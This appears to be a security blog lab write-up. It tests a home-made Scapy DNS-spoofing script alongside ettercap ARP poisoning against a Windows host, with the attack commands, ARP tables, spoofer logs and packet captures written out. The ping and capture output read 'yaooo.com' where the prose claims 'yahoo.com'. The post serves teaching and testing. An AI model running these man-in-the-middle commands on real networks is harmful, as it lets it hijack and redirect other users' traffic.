The testing phase
In the previous post we built a DNS Spoofing tool using Scapy and Python.
In this post, we will validate that the script is working as expected

In this lab we will have the following systems
Kali: 192.168.0.15 (.23)
Windows Hosts: 192.168.0.16 (.36)
Gateway: 192.168.0.1

Kali
On This system, we will add entries to our hosts file for some common domain.
Let's see what this looks like
root@securitynik:~# cat /etc/hosts
127.0.0.1    yahoo.com
127.0.0.1   microsoft.com

Let's look at the ARP cache of the Windows System
C:\>arp -aInterface: 192.168.0.16 --- 0x2
  Internet Address      Physical Address      Type
  192.168.0.1           00-04-5a-6c-db-79     dynamic

Let's look at a snapshot of the IPConfig and DNS Settings of the Windows System
Ethernet adapter Local Area Connection:
        IP Address. . . . . . . . . . . . : 192.168.0.16
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.0.1
        DNS Servers . . . . . . . . . . . : 8.8.8.8
                                            4.2.2.1

Let's look at the Windows system host file to ensure these names are not resolved locally
C:\>type "c:\WINDOWS\system32\drivers\etc\hosts"
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
127.0.0.1       localhost

Now let's go ahead and load dnsSpoof.py on Kali
root@securitynik:~/security-nik# ./dnsSpoof.py eth0 192.168.0.15
Current system is Linux ... Good to go!!
 Sniffing for DNS Packet

Let's load up ettercap to perform our ARP Spoofing for the gateway and the windows hosts
root@securitynik:~# ettercap --mitm arp:remote --text --iface eth0 /192.168.0.1/ /192.168.0.16/

Now that ettercap is running let's check the Windows system ARP Cache again
C:\>arp -a
Interface: 192.168.0.16 --- 0x2
  Internet Address      Physical Address      Type
  192.168.0.1           08-00-27-41-9b-6c     dynamic
  192.168.0.15          08-00-27-41-9b-6c     dynamic
Awesome!! It looks like the Kali system is claiming to be 192.168.0.1

Let's go ahead and ping some hosts from our Windows system.
Remember above when we ran ./dnsSpoof.py we used 192.168.0.15 as the spoofed DNS server (./dnsSpoof.py eth0 192.168.0.15)

C:\>ping yaooo.com -n 1 && ping microsoft.com -n 1
Pinging yaooo.com [192.168.0.15] with 32 bytes of data:
Reply from 192.168.0.15: bytes=32 time<1ms TTL=64

Pinging microsoft.com [192.168.0.15] with 32 bytes of data:
Reply from 192.168.0.15: bytes=32 time<1ms TTL=64

As can be seen above, the Windows system thinks that yahoo.com and microsoft.com are both at 192.168.0.15.

What did dnsSpoof see?
Got Query on Sun May 25 12:51:23 2014
 Received Src IP:192.168.0.16,
 Received Src Port: 53049
 Received Query ID:33693
 Query Data Count:1
 Current DNS Server:8.8.8.8
 DNS Query:yahoo.com.

 Sending spoofed response packet
Sent 1 packets.
 Spoofed DNS Server: 192.168.0.15
 src port:53 dest port:53049
 Sniffing for DNS Packet
 Sniffing for DNS Packet
 Sniffing for DNS Packet

 Got Query on Sun May 25 12:51:23 2014
 Received Src IP:192.168.0.16,
 Received Src Port: 64982
 Received Query ID:36189
 Query Data Count:1
 Current DNS Server:8.8.8.8
 DNS Query:microsoft.com.

 Sending spoofed response packet
Spoofed DNS Server: 192.168.0.15
 src port:53 dest port:64982

DNS Spoof did see the request for yahoo.com and microsoft.com and did send the spoof response.

But how can we further confirm this you ask? Ok let's look at the packet capture from the Window's system perspective
Packets don't lie ... or at least shouldn't :-)

C:\tools>WinDump.exe -nn -r dnsspoof.pcap port 53
reading from file dnsspoof.pcap, link-type EN10MB (Ethernet)
12:51:23.466964 IP 192.168.0.16.53049 > 8.8.8.8.53:  33693+ A? yaooo.com. (27)
12:51:23.480022 IP 192.168.0.15.53 > 192.168.0.16.53049:  33693*- 1/1/1 A 192.168.0.15 (11
2)

12:51:23.497526 IP 192.168.0.16.64982 > 8.8.8.8.53:  36189+ A? microsoft.com. (31)
12:51:23.503152 IP 192.168.0.15.53 > 192.168.0.16.64982:  36189*- 1/1/1 (128)


If we look at the captures and the messages from dnsSpoof we can see the following for yahoo.com
Both dnsSpoof and windump report the time as: 12:51:23
Looking at the source port we see the same: 53049
Looking at the query id, we see: 33693
... and the query name? we see we have yahoo.com
More importantly we see while the client at 192.168.0.16 made a request to 8.8.8.8, it actually got its response from 192.168.0.15

Based on the above, I would conclude the tool works as expected.

Go ahead and analyse the microsoft.com reuqest by yourself ;-)

As seen between these two posts on building and testing your own tools (dnsSpoof.py), it really does not take that much effort if you are willing to put in the time.